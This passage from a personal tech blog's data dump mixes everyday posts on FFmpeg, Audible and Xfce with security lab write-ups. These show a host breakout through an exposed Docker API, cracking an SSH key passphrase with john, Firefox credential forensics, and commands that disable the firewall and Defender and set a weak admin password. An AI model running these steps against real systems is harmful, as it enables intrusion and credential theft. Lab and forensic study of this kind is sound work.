02:42:C0:BE:60:03 (Unknown)\nService Info: OSs: Linux, linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 9.11 seconds\n````\n\n\nDefine the DOCKER_HOST environment variable to point to this remote TCP socket.\n```\nexport DOCKER_HOST=192.190.96.3:2375\n```\n\nNow we can mount the image to the host volume and do a host breakout if permissions are in place\n```\nevilsaint@marvel.lab:~# docker run -it -v /:/host ubuntu:18.04 bash\nroot@6a01ea2ace07:/# chroot /host\n#\n```\n\n## How can we secure this \n\nI will SSH into the remote host to perform the fix \n\nLet us kill the docker\n```\nps -ef | grep docker\n```\n\n```\nkill <pid>\n```\n\nRestart the docker service\n```\nservice docker start\n```\n\nNow we export the docker host to be accessible over SSH\n```\nroot@localhost:~# export DOCKER_HOST=ssh://root@192.190.96.3\n```"},{"fields":{"slug":"/error-importing-to-notion"},"excerpt":"consultant@DESKTOP-CFSRHKG MINGW64 ~/Desktop/bkup/finish $ file Access\\ Tokens-1.md Access Tokens-1.md: Unicode text, UTF-16, little-endian…","frontmatter":{"date":"13th August 2021 ","title":"Error Importing To Notion","description":"productivity","tags":"productivity","posttype":"blog"},"body":"\nconsultant@DESKTOP-CFSRHKG MINGW64 ~/Desktop/bkup/finish\n$ file Access\\ Tokens-1.md\nAccess Tokens-1.md: Unicode text, UTF-16, little-endian text, with CRLF line terminators\n\nconsultant@DESKTOP-CFSRHKG MINGW64 ~/Desktop/bkup/finish\n$ unix2dos.exe Access\\ Tokens-1.md\nunix2dos: converting UTF-16LE file Access Tokens-1.md to UTF-8 DOS format...\n\nconsultant@DESKTOP-CFSRHKG MINGW64 ~/Desktop/bkup/finish\n$ file Access\\ Tokens-1.md\nAccess Tokens-1.md: Unicode text, UTF-8 (with BOM) text, with CRLF line terminators"},{"fields":{"slug":"/cracking-ssh-private-key-passphrase"},"excerpt":"root@evilsaint:~# file id_rsa id_rsa: PEM RSA private key\n\nroot@evilsaint:~# whereis ssh2john\nssh2john: /usr/sbin/ssh2john\n\nroot@evilsaint:~…","frontmatter":{"date":"13th August 2021 ","title":"Cracking SSH Private Key Passphrase","description":"","tags":"ssh","posttype":"article"},"body":"\n```\nroot@evilsaint:~# file id_rsa\nid_rsa: PEM RSA private key\n```\n\n\n```\nroot@evilsaint:~# whereis ssh2john\nssh2john: /usr/sbin/ssh2john\n```\n\n\n```\nroot@evilsaint:~# locate ssh2john\n/usr/sbin/ssh2john\n```\n\n```\nroot@evilsaint:~# ssh2john id_rsa > converted_hash\n```\n\n```\nroot@evilsaint:~# john --wordlist=/usr/share/wordlists/rockyou.txt converted_hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (SSH [RSA/DSA 32/64])\nPress 'q' or Ctrl-C to abort, almost any other key for status\nrevenge2         (id_rsa)\n1g 0:00:00:00 DONE (2021-08-13 21:13) 2.702g/s 636721p/s 636721c/s 636721C/s revenge2\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed\n```\n\n\n```\nroot@evilsaint:~# john converted_hash --show\nid_rsa:revenge2\n\n1 password hash cracked, 0 left\n```"},{"fields":{"slug":"/firefox-browser-forensics"},"excerpt":null,"frontmatter":{"date":"12th August 2021 ","title":"Firefox Browser Forensics","description":"A look at Firefox Browser forensics","tags":"browser","posttype":"article"},"body":"# Firefox: History\n\n\n## SQLite Database\n\n> Inside the places.sqlite database file, there are two tables, moz_places and moz_annos, that store information needed to find downloaded files\n\ncontent-prefs.sqlite: stores site-specific content preferences.\ncookies.sqlite: stores cookie data.\nformhistory.sqlite: stores form input data.\npermissions.sqlite: stores site-specific permissions.\nplaces.sqlite: stores the history of visited sites.\nwebappstore.sqlite: stores Document Object Model (DOM) storage data.\nNote: This list was compiled from multiple sources. Not all files for every system are listed, and some files on this list may not be found on other systems.\n\n\nLocate the Mozilla storage files. \n```\nstudent@attackdefense:/$ cd ~/.mozilla/firefox/zevp8nk2.default/\nstudent@attackdefense:~/.mozilla/firefox/zevp8nk2.default$ ls *.sqlite\ncontent-prefs.sqlite  favicons.sqlite     kinto.sqlite        places.sqlite        storage.sqlite\ncookies.sqlite        formhistory.sqlite  permissions.sqlite  storage-sync.sqlite  webappsstore.sqlite\nstudent@attackdefense:~/.mozilla/firefox/zevp8nk2.default$ sqlite3 places.sqlite\nSQLite version 3.11.0 2016-02-15 17:29:24\nEnter \".help\" for usage hints.\nsqlite>\n```\n\nWe can query all records\n```\nsqlite> select * from moz_places;\n1|https://support.mozilla.org/en-US/products/firefox||gro.allizom.troppus.|0|0|0|137||iZpT3cYccuf2|1|47357795150914||2|https://www.mozilla.org/en-US/firefox/customize/||gro.allizom.www.|0|0|0|137||mkU9pzj7KxEp|1|47357014640010||\n3|https://www.mozilla.org/en-US/contribute/||gro.allizom.www.|0|0|0|137||qFX_kGoubYl7|1|47358034485371||4|https://www.mozilla.org/en-US/about/||gro.allizom.www.|0|0|0|137||gHDaQFcqAxTO|1|47358774953055||\n5|http://www.ubuntu.com/||moc.utnubu.www.|0|0|0|137||1-dNfm-NfyWA|1|125508050257634||6|http://wiki.ubuntu.com/||moc.utnubu.ikiw.|0|0|0|137||4Em1q9WFjljD|1|125511519733047||\n```\n\nWe can use SQL queries to interact\n```\nselect * from moz_places where url like '%releases.ubuntu.com%';\n```\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/af6edeb8-15ff-4712-a559-6416ddd859d6.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal text-dark\">Querying The Database</figcaption></figure>\n\nCounting the unique hosts.\n```\nsqlite> select count(*) from moz_hosts;\n36\nsqlite>\n```\n\nHistory\n```\nselect * from moz_historyvisits where place_id=41;\n```\n\nTable Schema \n```\nsqlite> .schema\n```\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/6fa64eb7-e269-4b8a-99fa-0a7388cac17c.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal text-dark\">Retrieving Schema</figcaption></figure>\n\n\n\n## Logins\n\n```\ncat logins.json | jq\ncat logins.json | python -m json.tool\n```\n\n```\nconsultant@evilsaint:~/.mozilla/firefox/esdp8nk2.default$ cat logins.json | python -m json.tool\n{\n    \"disabledHosts\": [],\n    \"logins\": [\n        {\n            \"encType\": 1,\n            \"encryptedPassword\": \"REDACTED\",\n            \"encryptedUsername\": \"REDACTED\",\n            \"formSubmitURL\": null,\n            \"guid\": \"{eedbf6dd-588b-46c5-b122-1999171667f6}\",\n            \"hostname\": \"chrome://FirefoxAccounts\",\n            \"httpRealm\": \"Firefox Accounts credentials\",\n            \"id\": 1,\n            \"passwordField\": \"\",\n            \"timeCreated\": 1539732575514,\n            \"timeLastUsed\": 1539732575514,\n            \"timePasswordChanged\": 1539732624376,\n            \"timesUsed\": 1,\n            \"usernameField\": \"\"\n        },\n        {\n            \"encType\": 1,\n            \"encryptedPassword\": \"REDACTED\",\n            \"encryptedUsername\": \"REDACTED\",\n            \"formSubmitURL\": \"https://github.com\",\n            \"guid\": \"{ccd2077a-2f06-406a-bf42-d8848243c86f}\",\n            \"hostname\": \"https://github.com\",\n            \"httpRealm\": null,\n            \"id\": 2,\n            \"passwordField\": \"password\",\n            \"timeCreated\": 1539733882060,\n            \"timeLastUsed\": 1539733882060,\n            \"timePasswordChanged\": 1539820282060,\n            \"timesUsed\": 1,\n            \"usernameField\": \"login\"\n        }\n    ],\n    \"nextId\": 5,\n    \"version\": 2\n}\n```\n\n\nTime GitHub Password changed\n```\ndate -d @1539820282060\n# Fri Dec 18 00:07:40 UTC 50764\n```"},{"fields":{"slug":"/why-can-i-not-delete-an-audible-original-podcast"},"excerpt":null,"frontmatter":{"date":"11th August 2021 ","title":"Why Can I Not Delete An Audible Original Podcast","description":"Deleting an Aubile Original Podcast","tags":"audible","posttype":"blog"},"body":"The weekend just gone I decided to have a digital de-clutter. While I could (and might) write an article on tips and tricks to remove digital clutter; this is not what this post is about. During the de-clutter I decided to prune my iPhone, removing images from camera roll and archiving the keepsakes to the cloud, deleting notes or moving them to my Notion app for archiving where appropriate, and deleting unused phone apps. \n\nWhile in my flow I decided to organise my Audible, this is where my flow halted... \n\nI love Audible! A while back I made listening to audio books part of my daily routine and at the time of this post I currently have 208 books downloaded to my device. In the effort to organise and reduce the digital clutter I mentioned I decided to go through and organise my book library and my podcasts into collections for easy retrieval. All was going well until I got to an Amazon Original podcast that I just didn't want on my device anymore. I downloaded it with the intention or listening to all the episodes but couldn't make it through the first one and so I decided the best remediation would be to delete it. Easy right?\n\nI am only a partially educated man who went to university twice and has completed some of the top networking, system administration and pentesting certificates in the industry and deleting an audiobook should be a piece of cake right!? Navigating around a a GUI should be no problem for a person that has to periodically test web applications for his living.... Nope. \n\nIt seems, the Amazon original podcasts are just not the same as regular books. In fact,  you cannot remove them from the iPhone application.  So I headed over to the audible.co.uk website to one again try and delete. After 15 minutes of refusing to Google and navigating around all of the menus in both the phone app and the audible.co.uk desktop website I felt defeated. \n\nAs part of my living I hack websites and so admitting defeat against a web UI is simply just not an option but thats what it came too.... I put it down as a bug and took to google to see if anyone else had the same problem. Turns out that many people have problems deleting normal books (which are easy to remove from your device) and if anyone out there did have the answer it was buried. \n\nThis takes me up to today! I still get a Free Subscription to the Amazon AWS Newsletter send to my kindle app and I wanted to remove it along with some sample books. This is where I discovered the answer to my previous problem. \n\nYou see, audible originals, are a lot more like podcasts than they are audiobooks and as I mentioned, there's no way to move them from the iPhone or Android, application or even on the audible website. However, there is a way around this.\n\nTo do this, you actually have to \n\n1, Login to the Amazon website.\n2, Go to Accounts, the drop down menu will appear.\n3, Look towards the end of the list, you'll see an option say manage your content and devices.\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/79a85828-191f-4ca5-ad0e-1c6ff79ed033.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal text-dark\">Account Menu on Amazon.</figcaption></figure>\n\n4, Once you're there, you need to select Show order books from the drop down menu.\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/a9ca7f25-b291-4882-b056-ce94958a1a5c.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal text-dark\">Manage Your Content and Devices</figcaption></figure>\n\n\nOnce you do this you might notice that you have a lot more items appearing than what you can see in the audible library. This is because each episode, within the series is listed as a separate item.\n\nNow, the search and the ordering and filtering on this screen, are not great, but it's enough to get you what you need, and that is to find the titles that you don't want anymore.\n\n5, Using the checkbox on the left hand side, select them. An orange border or circle on the rows on the table.\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/35cdd55b-f78b-48b1-b34e-802f2c35723e.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \" style=\"width: 100%\"><figcaption class=\"figure-caption text-center fw-normal text-dark\">Select Items to Delete</figcaption></figure>\n\n6, Go up to the top, delete button marked in orange and click Delete. A pop up will come, explaining that these items have been removed from your library.\n7, Now it is time to go to your app and sync your library.\n\n> You can do this by holding and pulling down on the home screen, until you see the little loader symbol starts to spin, alternatively, you can just double tap on the home key, and close the application completely, once the app is opened it will also have the same effect."},{"fields":{"slug":"/f-fmpeg-cheat-sheet"},"excerpt":"apt-get install ffmpeg Minimal example: transcode from MP3 to WMA:\n\nffmpeg -i input.mp3 output.wma\n\n\nYou can get the list of supported…","frontmatter":{"date":"2nd July 2021 ","title":"FFmpeg Cheat Sheet","description":"A handy cheat sheet of commands for the text line utility `ffmpeg`.","tags":"cheat-sheet, ffmpeg, mp3, wav, wma","posttype":"article"},"body":"# Installing FFMpeg\n\n```\napt-get install ffmpeg\n```\n\n\n# Converting Audio into Different Formats / Sample Rates\n\nMinimal example: transcode from MP3 to WMA:\n```\nffmpeg -i input.mp3 output.wma\n```\n\nYou can get the list of supported formats with:\n```\nffmpeg -formats\n```\n\nYou can get the list of installed codecs with:\n```\nffmpeg -codecs\n```\n\nConvert WAV to MP3, mix down to mono (use one audio channel), set bit rate to 64 kbps and  sample rate to 22050 Hz:\n```\nffmpeg -i input.wav -ac 1 -ab 64000 -ar 22050 output.mp3\n```\n\nConvert any MP3 file to WAV 16khz mono 16bit:\n```\nffmpeg -i 111.mp3 -acodec pcm_s16le -ac 1 -ar 16000 out.wav\n```\n\nConvert any MP3 file to WAV 20khz mono 16bit for ADDAC WAV Player:\n```\nffmpeg -i 111.mp3 -acodec pcm_s16le -ac 1 -ar 22050 out.wav\n```\n\n**cd into dir for the batch process:**\n```\nfor i in *.mp3; do ffmpeg -i \"$i\" -acodec pcm_s16le -ac 1 -ar 22050 \"${i%.mp3}-encoded.wav\"; done\n```\n\nPicking the 30 seconds fragment at an offset of 1 minute\n```\nffmpeg -i input.mp3 -ss 60 -t 30 output.wav\n```\n\nIn HH:MM:SS format\n```\nffmpeg -i input.mp3 -ss 0:01:00 -t 0:00:30 output.wav\n```\n\nSplit an audio stream at a specified segment rate (e.g. 3 seconds)\n```\nffmpeg -i somefile.mp3 -f segment -segment_time 3 -c copy out%03d.mp3\n```\n\n# Extract Audio\n\n`-vn` signals no video. `-acodec copy`  says to use the same audio stream that's already in there.\n```\nffmpeg -i input-video.avi -vn -acodec copy output-audio.aac \n```\n\nThe `-i` option is the input file/path. The `-f` specifies the format (in this case mp3 and the `-ab 192000` tells FFmpeg that we want the output to be encoded at 192Kbps, and as we learnt the last example `-vn` means we do not want video. \n```\nffmpeg -i video.mp4 -f mp3 -ab 192000 -vn music.mp3\n```\n\n# Replace Audio on a Video without re-encoding.\n\n**Preferred method**\n```\nffmpeg -i INPUT.mp4 -i AUDIO.wav -shortest -c:v copy -c:a aac -b:a 256k OUTPUT.mp4\n```\n\nStrip audio stream away from the video.\n```\nffmpeg -i INPUT.mp4 -codec copy -an OUTPUT.mp4\n```\n\nCombine the two streams (new audio with originally existing video).\n```\nffmpeg -i 36.MOV -i 36.wav -map 0:v -map 1:a -c copy -y 36-encoded.mov\n```\n\nOr add an offset to audio.\n```\nffmpeg -i 36.MOV -itsoffset -0.25 -i 36.wav -map 0:v -map 1:a -c copy -y 36-encoded.mov\n```\n\n> We can leave the audio format detection up to FFmpeg?\n\nTo convert one file:\n```\n ffmpeg -i videofile.mp4 -vn -acodec libvorbis audiofile.ogg \n```\n\nTo convert many files:\n```\n for vid in *.mp4; do ffmpeg -i \"$vid\" -vn -acodec libvorbis \"${vid%.mp4}.ogg\"; done \n```\n\nYou can, of course, select any FFmpeg parameters for audio encoding that you like, set things like bitrate, etc.\n\nUse ``` -acodec libmp3lame ```  and change the extension from ```.ogg``` to ```.mp3``` for mp3 encoding.\n\nIf you want to extract the audio, you can \"copy\" the audio track to a file using -acodec copy. Of course, the main difference is that transcoding is slow and CPU-intensive, while copying is speedy as you're just moving bytes from one file to another. Here's how to copy just the audio track (assuming it's in mp3 format):\n```\n ffmpeg -i videofile.mp4 -vn -acodec copy audiofile.mp3 \n```\n\nNote that in this case, the audio file format has to be consistent with what the container has (i.e. if the audio is AAC format, you have to say audiofile.aac). You can use the `ffprobe` command to see which formats you have; this may provide some information:\n```\n for file in *; do ffprobe $file 2>&1 |grep Audio; done \n```\n\nA possible way to automatically parse the audio codec and name the audio file accordingly would be\n```\n for file in *mp4 *avi; do ffmpeg -i \"$file\" -vn -acodec copy \"$file\".```ffprobe \"$file\" 2>&1 |sed -rn 's/.*Audio: (...), .*/\\1/p'```; done \n```\n\nNote that this command uses `sed` to parse output from `ffprobe` for each file. It assumes a 3-letter audio codec such as mp3, ogg or aac for example and will break if given anything different.\n\n\n# Encoding multiple files\n\nYou can use a Bash \"for loop\" to encode all files in a directory:\n```\nmkdir newfiles\nfor f in *.m4a; do ffmpeg -i \"$f\" -codec:v copy -codec:a libmp3lame -q:a 2 newfiles/\"${f%.m4a}.mp3\"; done\n```\n\nm4a to mp3 conversion with FFmpeg and lame\n```\nffmpeg -i input.m4a -acodec libmp3lame -ab 128k output.mp3\n``` \n\nA batch file version of the same command would be:\n```\nfor f in *.m4a; do ffmpeg -i \"$f\" -acodec libmp3lame -ab 256k \"${f%.m4a}.mp3\"; done\n```\n\n# Extract Single Image from a Video at Specified Frame\n\n```\nvf [ss][filename][outputFileName]\n```\n\nwhere `vf` is a custom bash script as follows:\n\n```\nffmpeg -ss $1 -i $2 -qmin 1 -q:v 1 -qscale:v 2 -frames:v 1 -huffman optimal $3.jpg\n```\n\nss offset = frame number divided by FPS of video = the decimal (in milliseconds) ffmpeg needs i.e. 130.5\n\n# Merge Multiple Videos\n\nConcatenate multiple files. \n```\ncat myvideos.txt\nfile '/path/to/file1'\nfile '/path/to/file2'\nfile '/path/to/file3'\n\n$ ffmpeg -f concat -safe 0 -i myvideos.txt -c copy output.mp4\n```\n\n# Split a Video into Images\n\n```\nffmpeg -i video.flv image%d.jpg\n```\n\n# Convert Images into a Video\n\n```\nffmpeg -f image2 -i image%d.jpg imagestovideo.mp4\n```\n\n```\nffmpeg -i image-%03d.png -c:v libx264 -pix_fmt yuv420p test.mp4\n```\n\n```\nffmpeg -r 1/5 -i image-%03d.png -c:v libx264 -vf fps=25 -pix_fmt yuv420p test.mp4\n```\n\n# Convert Single Image into a Video\n\n```\nffmpeg -loop 1 -i image.png -c:v libx264 -t 60 -pix_fmt yuv420p -vf scale=1920:1080 out.mp4\n```\n\n# Convert non-sequentially named Images in a directory \n\n```\nffmpeg -framerate 30 -pattern_type glob -i '*.jpeg' -c:v libx264 -pix_fmt yuv420p gan-1.mov\n```\n\n# Convert image sequence of many different sizes and conform to specific frame size\n\n```\nffmpeg -i image-%04d.jpg -c:v libx264 -pix_fmt yuv420p -vf \"scale=max(1280\\,a*720):max(1280\\,720/a),crop=1280:720\" test.mp4\n```\n\n# Guarantee aspect ratio from the image sequence\n\n```\nffmpeg -i image-%04d.jpg -c:v libx264 -pix_fmt yuv420p -vf \"scale=720:-2\" test.mp4\n```\n\n# Evaluate which ratio to apply for scaling, then scale with the requisite amount of padding\n\n```\nffmpeg -i image-%04d.jpg -c:v libx264 -pix_fmt yuv420p -vf \"scale=iw*min(1280/iw\\,720/ih):ih*min(1280/iw\\,720/ih), pad=1280:720:(1280-iw*min(1280/iw\\,720/ih))/2:(720-ih*min(1280/iw\\,720/ih))/2\" test.mp4\n```\n\n1920 version\n```\nffmpeg -i image-%04d.jpg -c:v libx264 -pix_fmt yuv420p -vf \"scale=iw*min(1920/iw\\,1080/ih):ih*min(1920/iw\\,1080/ih), pad=1920:1080:(1920-iw*min(1920/iw\\,1080/ih))/2:(1080-ih*min(1920/iw\\,1080/ih))/2\" test.mp4\n```\n\n# Convert .mov (JPEG-A or other codec) to H264 .mp4\n\n```\nffmpeg -i input.mov -vcodec libx264 -pix_fmt yuv420p output.mp4\n```\n\n# Simple FLAC convert\n\n```\nffmpeg -i audio.xxx -c:a flac audio.flac\n```\n\n# Mix Stereo to Mono\n\nYou can modify a video file directly without having to re-encode the video stream. However, the audio stream will need to encoded again.\n\n> If you want to use the right channel, write `0.1.1` instead of `0.1.0.`\n\nLeft channel to mono:\n```\nffmpeg -i video.mp4 -map_channel 0.1.0 -c:v copy mono.mp4\n```\n\nLeft channel to stereo:\n```\nffmpeg -i video.mp4 -map_channel 0.1.0 -map_channel 0.1.0 -c:v copy stereo.mp4\n```\n\n# Trim End of a File (mp3)\n\nThis command will slice up to 30 seconds without transcoding:\n```\nffmpeg -t 30 -i inputfile.mp3 -acodec copy outputfile.mp3\n```\n\n# To Encode or Re-encode?\n\nDo you need to cut video with re-encoding or without re-encoding mode? You can try the following command.\nSynopsis: ffmpeg -i [input_file] -ss [start_seconds] -t [duration_seconds] [output_file]\n\n### use FFmpeg cut mp4 video without re-encoding\n\nExample:\n\n```\nffmpeg -i source.mp4 -ss 00:00:05 -t 00:00:10 -c copy cut_video.mp4\n```\n\n### use FFmpeg cut mp4 video with re-encoding\n\nIf you want to cut off section from the beginning, drop `-t 00:00:10` from the command\n```\nffmpeg -i source.mp4 -ss 00:00:05 -t 00:00:10 -async 1 -strict -2 cut_video.mp4\n```\n\n### reduce filesize\n\nExample:\n\nThis command reported very little change in video quality and reductions of 90% of the filesize.\n```\nffmpeg -i input.mov -vcodec libx264 -crf 24 output.mp4\n```\n\nMake a grayscale version and scale to 640x480.\n```\nffmpeg -i video.mov -vf eq=saturation=0 -s 640x480 -c:v libx264 -crf 24 output.mp4\n```\n\n## Convert MP4 to WEBM\n\n```\nffmpeg -i input.mp4 -c:v libvpx-vp9 -crf 31 -b:v 1M output.webm\n```\n[more info](http://trac.ffmpeg.org/wiki/Encode/VP9)\n\n## Convert MKV to MP4\n\n```\nffmpeg -i file.mkv\n```\n\nCheck for streams that you want (video/audio). be sure to convert/specify DTS 6 channel audio stream\n```\nffmpeg -i input.mkv -strict experimental -map 0:0 -map 0:1 -c:v copy -c:a:1 libmp3lame -b:a 192k -ac 6 output.mp4\n```\n\n## Add Watermark overlay (png) to the centre of a video\n\n```\nffmpeg -i source.mov -i watermark.png -filter_complex \"overlay=x=(main_w-overlay_w)/2:y=(main_h-overlay_h)/2\" output.mp4\n```\n\n## Reverse a video\n\n```\nffmpeg -i vid.mp4 -vf reverse reversed.mp4\n```\n\n\n## Concat a video with a reversed copy of itself for ping-pong looping effect\n\n```\nffmpeg -i input.mp4 -filter_complex \"[0:v]reverse,fifo[r];[0:v][r] concat=n=2:v=1 [v]\" -map \"[v]\" output.mp4\n```"},{"fields":{"slug":"/finding-out-what-x-conf-setting"},"excerpt":"If you often find yourself configuring Xfce then this tip might be for! Xfce or XFCE (pronounced as four individual letters) is a free and…","frontmatter":{"date":"1st July 2021 ","title":"Finding Out What XConf Setting","description":"Finding out what xconf settings blog","tags":null,"posttype":"blog"},"body":"\nIf you often find yourself configuring Xfce then this tip might be for!\n\nXfce or XFCE (pronounced as four individual letters) is a free and open-source desktop environment for Unix-like operating systems. Xfconf is the configuration storage system for Xfce and we have to interact with it using the `xfconf-query` tool. \n\n> To access the `xfconf` there is a CLI tool `xfconf-query`. \n> https://docs.xfce.org/xfce/xfconf/xfconf-query\n\nIf you sometimes find yourself forgetting a property or wanting to learn a new property then you can run  `xconf-query` in monitor mode like so:\n```\nxfconf-query -c xfce4-desktop -m\n```\nYou can then change whatever setting you want on the system and observe for any xfce4-desktop changes to be displayed in the terminal. \n\nYou can then do the following to change the property from your terminal or from inside your scripts later on by doing the following:\n```\n xfconf-query -c xfce4-desktop -p <property> -s <set path/image/value>\n```"},{"fields":{"slug":"/scripting-lab-machines-code-snippets"},"excerpt":"When creating home lab machines you may have a common set of needs that you wish to apply to each one. · Enable Workplace Network Sharing…","frontmatter":{"date":"20th June 2021 ","title":"Scripting Lab Machines: Code Snippets","description":"The below is an assortment of commands I frequently use when scripting the building of Windows machines and the creation of Active Directory environments.","tags":null,"posttype":"article"},"body":"When creating home lab machines you may have a common set of needs that you wish to apply to each one. \n\n\t· Enable Workplace Network Sharing\n\t· Disable ICE Protections on Servers\n\t· Turn off Windows Defender\n\t· Disable Updates\n\nThe below assortment of commands is what I used to script the building of Windows machines and the creation of Active Directory Environments. \n\n\n## Language and Locale\n\n\nPowerShell\n```\nSet-WinUserLanguageList -LanguageList en-GB -Force\nSet-WinSystemLocale en-GB\nSet-Culture en-GB\n```\n\n## Set Power Options\n\nCMD\n```\npowercfg.exe -change -monitor-timeout-ac 0\npowercfg.exe -change -monitor-timeout-dc 0\npowercfg.exe -change -disk-timeout-ac 0\npowercfg.exe -change -disk-timeout-dc 0\npowercfg.exe -change -standby-timeout-ac 0\npowercfg.exe -change -standby-timeout-dc 0\npowercfg.exe -change -hibernate-timeout-ac 0\npowercfg.exe -change -hibernate-timeout-dc 0\n```\n\n## Firewall\n\nPowerShell\n```\nSet-NetFirewallProfile -All -Enabled False\n```\n\nCMD\n```\nnetsh firewall set opmode disable\nnetsh advfirewall set allprofiles state off\n```\n\nIf keeping the firewall on then for labs you might need to enable File and Print sharing.\n```\nnetsh firewall set service type=fileandprint mode=enable profile=\"ALL\"\n```\n\n\n\n## Turn off Shutdown Events\n\n\nPowershell\n```\nSet-ItemProperty -Path \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Reliability\" -Name \"ShutdownReasonOn\" -Value 0\nSet-ItemProperty -Path \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Reliability\" -Name \"ShutdownReasonUI\" -Value 0\n```\n\nCMD\n```\nreg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Reliability\" /v ShutdownReasonOn /t REG_DWORD /d 0 /f\nreg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Reliability\" /v ShutdownReasonUI /t REG_DWORD /d 0 /f\n```\n\n## Turn off Windows Updates (On Desktop)\n\n\nPowerShell\n```\nSet-ItemProperty -Path \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" -Name \"AUOptions\" -Value 1\nSet-ItemProperty -Path \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate\\Auto Update\" -Name \"AUOptions\" -Value 1\n```\n\nCMD (Windows 10)\n```\nreg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v AUOptions /t REG_DWORD /d 1 /f\nreg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate\\Auto Update\" /v AUOptions /t REG_DWORD /d 1 /f\n```\n\nOn Windows 10 builds I sometimes also need to do the following\n```\nnet stop wuauserv\nnet stop bits\nnet stop dosvc\n```\n\n## Disable Screen Saving (On Desktop)\n\nPowerShell\n```\nSet-ItemProperty -Path \"HKCU\\Software\\Policies\\Microsoft\\Windows\\Control Panel\\Desktop\" -Name \"ScreenSaveActive\" -Value 0\n```\n\nCMD\n```\nreg add \"HKCU\\Software\\Policies\\Microsoft\\Windows\\Control Panel\\Desktop\" /v ScreenSaveActive /t REG_SZ /d 0 /f\n```\n\n## Stop Windows Defender\n\nPowerShell\n```\nStop-Service -Name WinDefend\nRemove-WindowsFeature Windows-Defender\n```\n\n## Enable RDP\n\nPowerShell\n```\nSet-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server'-name \"fDenyTSConnections\" -Value 0 \nSet-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name \"UserAuthentication\" -Value 1\n```\n\nCMD\n```\nnetsh advfirewall firewall set rule name=\"Remote Desktop - User Mode (TCP-In)\" new enable =Yes profile=\"domain,private,public\"\nnetsh advfirewall firewall set rule name=\"Remote Desktop - User Mode (UDP-In)\" new enable =Yes profile=\"domain,private,public\"\n```\n\n## Turn Off IE Enhanced Security (Servers)\n\nPowerShell\n```\nSet-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{A509B1A8-37EF-4b3f-8CFC-4F3A74704073}\" -Name \"IsInstalled\" -Value 0\nStop-Process -Name Explorer\n```\n\n## Activate Administrator Account and Set Password\n\n\nCMD\n```\nnet user Administrator /active:yes\nnet user Administrator Passw0rd!\n```\n\n## Rename Computer Hostname \n\nPowerShell\n```\n$ComputerInfo = Get-WmiObject -Class Win32_ComputerSystem\n$ComputerInfo.Rename($mchname)\n```\n\nCMD\n```\nRename-Computer -NewName $hostname\n```"},{"fields":{"slug":"/a-perfect-box-in-the-cloud"},"excerpt":"Vultr choco install -y git\nchoco install -y notepadplusplus.install\nchoco install -y pycharm\nchoco install -y xampp-80\nchoco install -y…","frontmatter":{"date":"19th June 2021 ","title":"A Perfect Box In The Cloud","description":"During a recent period where I had to relocate a lot of my digital estate, I found myself without a powerful core machine capable of managing multiple projects. This led me down a path in which I experienced the pros and cons of working in the cloud and in this article I will talk about my journey to find the perfect platform for me to work on","tags":"vultr","posttype":"article"},"body":"\n## Vultr\n\n```\nchoco install -y git\nchoco install -y notepadplusplus.install\nchoco install -y pycharm\nchoco install -y xampp-80\nchoco install -y wireshark\nchoco install -y chromium\nchoco install -y visualstudio2019community\nchoco install -y microsoft-edge\nchoco install -y grammarly-edge\nchoco install -y selenium-all-drivers\nchoco install -y python3\nchoco install -y sysinternals\nchoco install -y dogtail.dotnet3.5sp1\nchoco install -y netfx-4.5.2-devpack\nchoco install -y vscode\nchoco install -y vscode-python\nchoco install -y vscode-ansible\nchoco install -y vscode-docker\nchoco install -y windowdetective\nchoco install -y terraform\nchoco install -y windbg\nchoco install -y rsat\nchoco install -y dnspy\nchoco install -y markdownmonster\nchoco install -y unxutils\nchoco install -y 7zip\nchoco install -y clipx\nchoco install -y putty\nchoco install -y putty-ng\nchoco install -y winrar\nchoco install -y vscode-csharp\nchoco install -y bitvise-ssh-server\nchoco install -y ssh-copy-id\nchoco install -y puttytray\nchoco install -y mingw\nchoco install -y autoit\nchoco install -y powershelluniversal\nchoco install -y dropit.portable\nchoco install -y mousecontroller\nchoco install -y phraseexpress.portable\nchoco install -y eventghost\nchoco install -y clipboardfusion\nchoco install -y tinytask\nchoco install -y big-stretch-reminder\nchoco install -y stretchly\nchoco install -y toggl\nchoco install -y pomotime\nchoco install -y launchy\nchoco install -y everything\nchoco install -y freeter\nchoco install -y docker-machine\nchoco install -y docker-compose\nchoco install -y 